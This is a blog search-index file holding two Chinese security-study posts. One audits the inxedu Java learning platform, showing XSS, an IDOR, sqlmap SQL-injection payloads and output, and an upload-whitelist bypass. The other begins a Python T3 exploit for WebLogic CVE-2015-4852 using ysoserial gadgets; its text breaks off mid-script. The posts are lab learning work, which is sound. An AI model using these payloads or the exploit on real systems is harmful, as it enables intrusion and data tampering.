<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java代码审计学习（一）</title>
      <link href="2021/09/05/inxedu/"/>
      <url>2021/09/05/inxedu/</url>
      
        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol><li><p>下载<a href="https://gitee.com/inxeduopen/inxedu">源码</a>，导入idea</p></li><li><p>pom.xml 修改端口</p></li><li><p>project.properties 修改项目路径（修改为192.168.0.104的原因是让burpsuite能抓到包）</p></li></ol><p><img src="/2021/09/05/inxedu/image-20210905124008702.png" alt="image-20210905124008702"></p><h3 id="配置和结构"><a href="#配置和结构" class="headerlink" title="配置和结构"></a>配置和结构</h3><h4 id="maven结构"><a href="#maven结构" class="headerlink" title="maven结构"></a>maven结构</h4><ul><li><code>src/main/java</code> 项目的源代码所在的目录</li><li><code>src/main/resources</code> 项目的资源文件所在的目录</li><li><code>src/main/filters</code> 项目的资源过滤文件所在的目录</li><li><code>src/main/webapp</code> 如果是web项目，则该目录是web应用源代码所在的目录，比如html文件和web.xml等都在该目录下</li></ul><h4 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h4><p>POM( Project Object Model，项目对象模型 ) 是 Maven 工程的基本工作单元，是一个XML文件，包含了项目的基本信息，用于描述项目如何构建，声明项目依赖，等等。</p><h4 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h4><p>配置欢迎页、404、filter、servlet等等。</p><h4 id="Spring-mvc-xml"><a href="#Spring-mvc-xml" class="headerlink" title="Spring-mvc.xml"></a>Spring-mvc.xml</h4><p>配置注解、前后台拦截等等</p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="前台xss漏洞"><a href="#前台xss漏洞" class="headerlink" title="前台xss漏洞"></a>前台xss漏洞</h4><p>通过在<code>WEB-INF</code>搜索一些关键字来找一些输出点，发现部分输出点参数可控，并且没有经过过滤。</p><p><img src="/2021/09/05/inxedu/image-20210905134305748.png" alt="image-20210905134305748"></p><p>更新用户信息处<code>src/main/java/com/inxedu/os/edu/controller/user/UserController.java</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/updateUser&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title">updateUserInfo</span><span class="params">(HttpServletRequest request,<span class="meta">@ModelAttribute(&quot;user&quot;)</span> User user)</span></span>&#123;</span><br><span class="line">   Map&lt;String,Object&gt; json = <span class="keyword">new</span> HashMap&lt;String,Object&gt;();</span><br><span class="line">   <span class="keyword">try</span>&#123;</span><br><span class="line">      userService.updateUser(user);</span><br><span class="line">      json = <span class="keyword">this</span>.setJson(<span class="keyword">true</span>, <span class="string">&quot;修改成功&quot;</span>, user);</span><br><span class="line">      <span class="comment">//缓存用户</span></span><br><span class="line">      userService.setLoginInfo(request,user.getUserId(),<span class="string">&quot;false&quot;</span>);</span><br><span class="line">   &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="keyword">this</span>.setAjaxException(json);</span><br><span class="line">      logger.error(<span class="string">&quot;updateUserInfo()---error&quot;</span>,e);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> json;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/inxedu/image-20210905134321938.png" alt="image-20210905134321938"></p><p><img src="/2021/09/05/inxedu/image-20210905134346083.png" alt="image-20210905134346083"></p><p>搜索课程处<code>src/main/java/com/inxedu/os/edu/controller/course/CourseController.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 课程列表展示,搜索课程</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/front/showcoulist&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">showCourseList</span><span class="params">(HttpServletRequest request, <span class="meta">@ModelAttribute(&quot;page&quot;)</span> PageEntity page, <span class="meta">@ModelAttribute(&quot;queryCourse&quot;)</span> QueryCourse queryCourse)</span> </span>&#123;</span><br><span class="line">        ModelAndView model = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        model.setViewName(showCourseList);</span><br><span class="line">            <span class="comment">// 页面传来的数据放到page中</span></span><br><span class="line">        page.setPageSize(<span class="number">12</span>);</span><br><span class="line">            <span class="comment">//只查询上架的</span></span><br><span class="line">            queryCourse.setIsavaliable(<span class="number">1</span>);</span><br><span class="line">            <span class="comment">// 搜索课程列表</span></span><br><span class="line">            List&lt;CourseDto&gt; courseList = courseService.queryWebCourseListPage(queryCourse, page);</span><br><span class="line">            model.addObject(<span class="string">&quot;courseList&quot;</span>, courseList);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 查询所有1级专业</span></span><br><span class="line">            QuerySubject querySubject = <span class="keyword">new</span> QuerySubject();</span><br><span class="line">            querySubject.setParentId(<span class="number">0</span>);</span><br><span class="line">            List&lt;Subject&gt; subjectList = subjectService.getSubjectList(querySubject);</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="comment">//根据条件专业查询 所有的子专业</span></span><br><span class="line">            <span class="keyword">if</span> (ObjectUtils.isNotNull(queryCourse.getSubjectId())) &#123;</span><br><span class="line">                Subject subject = <span class="keyword">new</span> Subject();</span><br><span class="line">                subject.setSubjectId(queryCourse.getSubjectId());</span><br><span class="line">                subject = subjectService.getSubjectBySubject(subject);</span><br><span class="line">                <span class="comment">//查询子专业</span></span><br><span class="line">                List&lt;Subject&gt; sonSubjectList = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (subject.getParentId() != <span class="number">0</span>) &#123;<span class="comment">//如果条件为二级专业（根据父级id，查询所有的子级）</span></span><br><span class="line">                    sonSubjectList = subjectService.getSubjectListByOne(Long.valueOf(subject.getParentId()));</span><br><span class="line">                    model.addObject(<span class="string">&quot;subjectParentId&quot;</span>, subject.getParentId());<span class="comment">//父级id</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//如果条件为一级专业（根据id，查询所有的子级）</span></span><br><span class="line">                    sonSubjectList = subjectService.getSubjectListByOne(Long.valueOf(subject.getSubjectId()));</span><br><span class="line">                &#125;</span><br><span class="line">                model.addObject(<span class="string">&quot;sonSubjectList&quot;</span>, sonSubjectList);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 全部教师</span></span><br><span class="line">            QueryTeacher query = <span class="keyword">new</span> QueryTeacher();</span><br><span class="line">            List&lt;Teacher&gt; teacherList =teacherService.queryTeacherList(query);</span><br><span class="line">            </span><br><span class="line">            model.addObject(<span class="string">&quot;page&quot;</span>,page);</span><br><span class="line">            model.addObject(<span class="string">&quot;queryCourse&quot;</span>, queryCourse);</span><br><span class="line">            model.addObject(<span class="string">&quot;teacherList&quot;</span>, teacherList);</span><br><span class="line">            model.addObject(<span class="string">&quot;subjectList&quot;</span>, subjectList);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        model.setViewName(<span class="keyword">this</span>.setExceptionRequest(request, e));</span><br><span class="line">            logger.error(<span class="string">&quot;showCourseList()--error&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> model;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/09/05/inxedu/image-20210905135306583.png" alt="image-20210905135306583"></p><p><img src="/2021/09/05/inxedu/image-20210905144455646.png" alt="image-20210905144455646"></p><h4 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h4><p>在刚刚的更新用户信息处<br><code>src/main/java/com/inxedu/os/edu/controller/user/UserController.java</code> ，对用户的权限没有进行判断，修改<code>user.userId</code>可修改他人信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/updateUser&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Map&lt;String,Object&gt; <span class="title">updateUserInfo</span><span class="params">(HttpServletRequest request,<span class="meta">@ModelAttribute(&quot;user&quot;)</span> User user)</span></span>&#123;</span><br><span class="line">Map&lt;String,Object&gt; json = <span class="keyword">new</span> HashMap&lt;String,Object&gt;();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">userService.updateUser(user);</span><br><span class="line">json = <span class="keyword">this</span>.setJson(<span class="keyword">true</span>, <span class="string">&quot;修改成功&quot;</span>, user);</span><br><span class="line"><span class="comment">//缓存用户</span></span><br><span class="line">userService.setLoginInfo(request,user.getUserId(),<span class="string">&quot;false&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="keyword">this</span>.setAjaxException(json);</span><br><span class="line">logger.error(<span class="string">&quot;updateUserInfo()---error&quot;</span>,e);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> json;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateUser</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">userDao.updateUser(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="后台sql注入漏洞"><a href="#后台sql注入漏洞" class="headerlink" title="后台sql注入漏洞"></a>后台sql注入漏洞</h4><p>在登录后台的时候，getLocalHost函数会报错，需要修改本地host。</p><p><img src="/2021/09/05/inxedu/image-20210905122551982.png" alt="image-20210905122551982"></p><p><img src="/2021/09/05/inxedu/image-20210905122513011.png" alt="image-20210905122513011"></p><p><img src="/2021/09/05/inxedu/image-20210905122459123.png" alt="image-20210905122459123"></p><p>在<code>mybatis</code>文件夹下搜索<code>$</code>符号，发现部分sql语句存在直接拼接，直接用sqlmap。</p><p><code>src/main/resources/mybatis/inxedu/article/ArticleMapper.xml</code>处：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 删除文章 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteArticleByIds&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">DELETE FROM EDU_ARTICLE WHERE EDU_ARTICLE.ARTICLE_ID IN ($&#123;value&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: #1* ((custom) POST)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span><br><span class="line">    Payload: articelId&#x3D;2) AND 4484&#x3D;(SELECT (CASE WHEN (4484&#x3D;4484) THEN 4484 ELSE (SELECT 2521 UNION SELECT 3040) END))-- -</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: articelId&#x3D;2) AND GTID_SUBSET(CONCAT(0x716b6a7171,(SELECT (ELT(9854&#x3D;9854,1))),0x71786a6271),9854)-- WcSf</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &lt; 5.0.12 AND time-based blind (heavy query)</span><br><span class="line">    Payload: articelId&#x3D;2) AND 1394&#x3D;BENCHMARK(5000000,MD5(0x52527851))-- dXOf</span><br><span class="line">---</span><br><span class="line">[12:44:34] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.6</span><br></pre></td></tr></table></figure><p><code>src/main/resources/mybatis/inxedu/course/CourseKpointMapper.xml</code>处：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 删除视频节点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteKpointByIds&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;java.lang.String&quot;</span>&gt;</span></span><br><span class="line">DELETE FROM EDU_COURSE_KPOINT where EDU_COURSE_KPOINT.KPOINT_ID IN($&#123;value&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: #1* (URI)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: http:&#x2F;&#x2F;192.168.0.104:8080&#x2F;admin&#x2F;kpoint&#x2F;deletekpoint&#x2F;(SELECT (CASE WHEN (4331&#x3D;4331) THEN 65 ELSE (SELECT 6797 UNION SELECT 8292) END)),</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;&#x3D; 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: http:&#x2F;&#x2F;192.168.0.104:8080&#x2F;admin&#x2F;kpoint&#x2F;deletekpoint&#x2F;65 AND (SELECT 1279 FROM (SELECT(SLEEP(5)))thAc),</span><br><span class="line">---</span><br><span class="line">[13:07:55] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;&#x3D; 5.0.12</span><br></pre></td></tr></table></figure><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p><code>/src/main/webapp/WEB-INF/lib/inxedu-jar.jar!/com/inxedu/os/common/controller/ImageUploadController.class</code>处，各种上传头像处都有白名单验证，但是白名单（除了jsp）可控</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fileType.contains(ext) &amp;&amp; !<span class="string">&quot;jsp&quot;</span>.equals(ext)) &#123;</span><br><span class="line">    String filePath = <span class="keyword">this</span>.getPath(request, ext, param);</span><br><span class="line">    File file = <span class="keyword">new</span> File(<span class="keyword">this</span>.getProjectRootDirPath(request) + filePath);</span><br><span class="line">    <span class="keyword">if</span> (!file.getParentFile().exists()) &#123;</span><br><span class="line">        file.getParentFile().mkdirs();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uploadfile.transferTo(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.responseData(filePath, <span class="number">0</span>, <span class="string">&quot;上传成功&quot;</span>, response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.responseErrorData(response, <span class="number">1</span>, <span class="string">&quot;文件格式错误，上传失败。&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试jspx</p><p><img src="/2021/09/05/inxedu/image-20210905165637874.png" alt="image-20210905165637874"></p><p><img src="/2021/09/05/inxedu/image-20210905170811389.png" alt="image-20210905170811389"></p><p>很遗憾，可能需要配置某些东西来解析jspx，以后学会了再看</p><p><img src="/2021/09/05/inxedu/image-20210905171111690.png" alt="image-20210905171111690"></p><p>另外两处<code>src/main/java/com/inxedu/os/common/controller/VideoUploadController.java</code>，白名单可控，手动添加jsp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 视频上传</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/uploadvideo&quot;,method=&#123;RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">gok4</span><span class="params">(HttpServletRequest request,HttpServletResponse response,<span class="meta">@RequestParam(value=&quot;uploadfile&quot; ,required=true)</span> MultipartFile uploadfile,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="meta">@RequestParam(value=&quot;param&quot;,required=false)</span> String param,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="meta">@RequestParam(value=&quot;fileType&quot;,required=true)</span> String fileType)</span></span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">String[] type = fileType.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="comment">//设置图片类型</span></span><br><span class="line">setFileTypeList(type);</span><br><span class="line"><span class="comment">//获取上传文件类型的扩展名,先得到.的位置，再截取从.的下一个位置到文件的最后，最后得到扩展名</span></span><br><span class="line">String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());</span><br><span class="line"><span class="keyword">if</span>(!fileType.contains(ext))&#123;</span><br><span class="line"><span class="keyword">return</span> responseErrorData(response,<span class="number">1</span>,<span class="string">&quot;文件格式错误，上传失败。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取文件路径</span></span><br><span class="line">String filePath = getPath(request,ext,param);</span><br><span class="line">File file = <span class="keyword">new</span> File(getProjectRootDirPath(request)+filePath);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果目录不存在，则创建</span></span><br><span class="line"><span class="keyword">if</span>(!file.getParentFile().exists())&#123;</span><br><span class="line">file.getParentFile().mkdirs();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保存文件</span></span><br><span class="line">uploadfile.transferTo(file);</span><br><span class="line"><span class="comment">//返回数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> responseData(filePath,<span class="number">0</span>,<span class="string">&quot;上传成功&quot;</span>,response);</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">logger.error(<span class="string">&quot;gok4()--error&quot;</span>,e);</span><br><span class="line"><span class="keyword">return</span> responseErrorData(response,<span class="number">2</span>,<span class="string">&quot;系统繁忙，上传失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用上传音频</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value=&quot;/uploadaudio&quot;,method=&#123;RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">uploadAudio</span><span class="params">(HttpServletRequest request,HttpServletResponse response,<span class="meta">@RequestParam(value=&quot;uploadfile&quot; ,required=true)</span> MultipartFile uploadfile,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="meta">@RequestParam(value=&quot;param&quot;,required=false)</span> String param,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="meta">@RequestParam(value=&quot;fileType&quot;,required=true)</span> String fileType)</span></span>&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">String[] type = fileType.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="comment">//设置图片类型</span></span><br><span class="line">setFileTypeList(type);</span><br><span class="line"><span class="comment">//获取上传文件类型的扩展名,先得到.的位置，再截取从.的下一个位置到文件的最后，最后得到扩展名</span></span><br><span class="line">String ext = FileUploadUtils.getSuffix(uploadfile.getOriginalFilename());</span><br><span class="line"><span class="keyword">if</span>(!fileType.contains(ext))&#123;</span><br><span class="line"><span class="keyword">return</span> responseErrorData(response,<span class="number">1</span>,<span class="string">&quot;文件格式错误，上传失败。&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取文件路径</span></span><br><span class="line">String filePath = getPath(request,ext,param);</span><br><span class="line">File file = <span class="keyword">new</span> File(getProjectRootDirPath(request)+filePath);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果目录不存在，则创建</span></span><br><span class="line"><span class="keyword">if</span>(!file.getParentFile().exists())&#123;</span><br><span class="line">file.getParentFile().mkdirs();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//保存文件</span></span><br><span class="line">uploadfile.transferTo(file);</span><br><span class="line"><span class="comment">//返回数据</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> responseData(filePath,<span class="number">0</span>,<span class="string">&quot;上传成功&quot;</span>,response);</span><br><span class="line">&#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">logger.error(<span class="string">&quot;gok4()--error&quot;</span>,e);</span><br><span class="line"><span class="keyword">return</span> responseErrorData(response,<span class="number">2</span>,<span class="string">&quot;系统繁忙，上传失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似头像上传的表单，修改一下uri</p><p><img src="/2021/09/05/inxedu/image-20210905174927620.png" alt="image-20210905174927620"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>快速定位关键函数的能力、对危险函数的熟悉程度需要不断提高，还需要把Java的一些框架系统的学习一下。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://xz.aliyun.com/t/2646#toc-9">https://xz.aliyun.com/t/2646#toc-9</a><br><a href="https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji">https://shu1l.github.io/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>commons-collections 利用链学习</title>
      <link href="2021/08/20/weblogic/"/>
      <url>2021/08/20/weblogic/</url>
      
        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境：cve-2015-4852</p><p>Weblogic环境搭建工具： <a href="https://github.com/QAX-A-Team/WeblogicEnvironment">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><p>IDEA+docker进行远程漏洞调试：<a href="https://www.cnblogs.com/ph4nt0mer/p/11772709.html">https://www.cnblogs.com/ph4nt0mer/p/11772709.html</a></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> popen</span><br><span class="line"><span class="keyword">import</span> struct <span class="comment"># 负责大小端的转换</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePayload</span>(<span class="params">gadget,cmd</span>):</span></span><br><span class="line">    YSO_PATH = <span class="string">&quot;ysoserial.jar&quot;</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-jar&#x27;</span>,YSO_PATH,gadget,cmd],stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">T3Exploit</span>(<span class="params">ip,port,payload</span>):</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((ip,port))</span><br><span class="line">    handshake = <span class="string">&quot;t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n&quot;</span> </span><br><span class="line">    sock.sendall(handshake.encode())</span><br><span class="line">    data = sock.recv(<span 